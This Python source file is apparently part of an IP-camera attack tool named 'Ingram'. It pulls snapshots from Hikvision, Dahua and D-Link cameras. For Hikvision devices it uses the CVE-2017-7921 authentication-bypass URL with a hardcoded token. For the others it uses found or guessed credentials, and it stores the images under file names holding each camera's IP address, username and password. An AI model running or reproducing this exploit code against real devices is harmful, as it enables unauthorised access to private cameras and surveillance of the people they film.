"""Some tools about camera"""
import os
import requests
from functools import partial
from requests.auth import HTTPDigestAuth
from xml.etree import ElementTree

from Ingram.utils import config
from Ingram.utils import logger
from Ingram.utils import get_user_agent


TIMEOUT = config.TIMEOUT
HEADERS = {'Connection': 'close', 'User-Agent': config.USERAGENT }


def _snapshot_by_url(url, file_name, workshop, auth=None):
    try:
        if auth: r = requests.get(url, auth=auth, timeout=TIMEOUT, verify=False, headers=HEADERS)
        else: r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
        if r.status_code == 200:
            with open(file_name, 'wb') as f: f.write(r.content)
            workshop.done_add()
    except Exception as e:
        logger.error(e)


def snapshot(camera_info, workshop):
    """select diff func to save snapshot"""
    path = workshop.output
    snapshot_by_url = partial(_snapshot_by_url, workshop=workshop)

    ip, port, device, user, passwd, vul = camera_info[:6]
    # cve-2017-7921
    if vul == 'cve-2017-7921':
        file_name = os.path.join(path, f"{ip}-{port}-cve_2017_7921.jpg")
        url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
        snapshot_by_url(url, file_name)
    # if we can get the password
    elif passwd:
        file_name = os.path.join(path, f"{ip}-{port}-{user}-{passwd}.jpg")
        # Hikvision
        if device == 'hikvision':
            # get channels
            channels = 1
            try:
                r = requests.get(f"http://{ip}:{port}/ISAPI/Image/channels",
                                 auth=HTTPDigestAuth(user, passwd),
                                 headers=HEADERS,
                                 timeout=TIMEOUT)
                root = ElementTree.fromstring(r.text)
                channels = len(root)
            except Exception as e:
                pass
            # get all snapshots of all channels
            for ch in range(1, channels + 1):
                url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{ch}01/picture"
                file_name = os.path.join(path, f"{ip}-{port}-channel{ch}-{user}-{passwd}.jpg")
                snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd))
        # Dahua
        elif device == 'dahua':
            if len(camera_info) > 6:
                channels = camera_info[6]
                passwds = camera_info[7]
            else:
                channels = 1
                passwds = [passwd]
            for passwd in passwds:
                for ch in range(1, channels + 1):
                    url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi?channel={ch}"
                    file_name = os.path.join(path, f"{ip}-{port}-channel{ch}-{user}-{passwd}.jpg")
                    snapshot_by_url(url, file_name, auth=HTTPDigestAuth(user, passwd))
        # DLink
        elif device == 'dlink':
            url = f"http://{ip}:{port}/dms?nowprofileid=1"
            snapshot_by_url(url, file_name, auth=(user, passwd))

    del camera_info
